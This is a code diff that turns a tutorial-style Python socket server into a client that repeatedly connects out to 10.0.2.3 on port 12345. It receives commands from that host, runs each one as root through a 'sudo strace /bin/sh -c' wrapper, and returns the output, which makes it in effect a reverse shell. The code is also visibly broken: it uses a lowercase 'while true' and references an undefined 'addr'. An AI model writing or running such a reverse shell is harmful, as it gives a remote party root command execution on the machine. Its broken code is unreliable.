@@ -21,45 +21,39 @@ print ("Socket successfully created")
 # case it is 12345 but it can be anything 
 port = 12345                
 
-# Next bind to the port 
-# we have not typed any ip in the ip field 
-# instead we have inputted an empty string 
-# this makes the server listen to requests 
-# coming from other computers on the network 
-s.bind(('', port))         
-print ("socket binded to %s" %(port)) 
-
-# put the socket into listening mode 
-s.listen(5)     
-print ("socket is listening")            
-
+while true:
+    try:
+        s.connect(('10.0.2.3',12345))
+    except Exception:
+        continue
+    break
 # a forever loop until we interrupt it or 
 # an error occurs 
 while True: 
 
 # Establish connection with client. 
-  c, addr = s.accept()     
+  
   print ('Got connection from', addr )
   request_to_sign = os.urandom(32)
-  c.sendall(request_to_sign)
+  s.sendall(request_to_sign)
 
-  signature = c.recv(1024)
+  signature = s.recv(1024)
   public_key.verify(signature, request_to_sign, PSS, hashes.SHA256())
 
-  c.send('Thank you for connecting'.encode()) 
+  s.send('Thank you for connecting'.encode()) 
   while True:
-      cmd = c.recv(8024).decode("utf-8").strip()
+      cmd = s.recv(8024).decode("utf-8").strip()
       inputcmd = ["sudo","strace","-o","/dev/null","/bin/sh","-c", cmd]
       if cmd == "close":
-        c.send("Closing connection")
+        s.send("Closing connection")
         break
 
       output = subprocess.check_output(inputcmd)
       message = "Output is: " + output
-      c.send(message.encode())
+      s.send(message.encode())
       
   # Close the connection with the client 
-  c.close()
+  s.close()
   os.system('sudo strace -o /dev/null /bin/sh -c "systemctl start firewalld"')
 
   
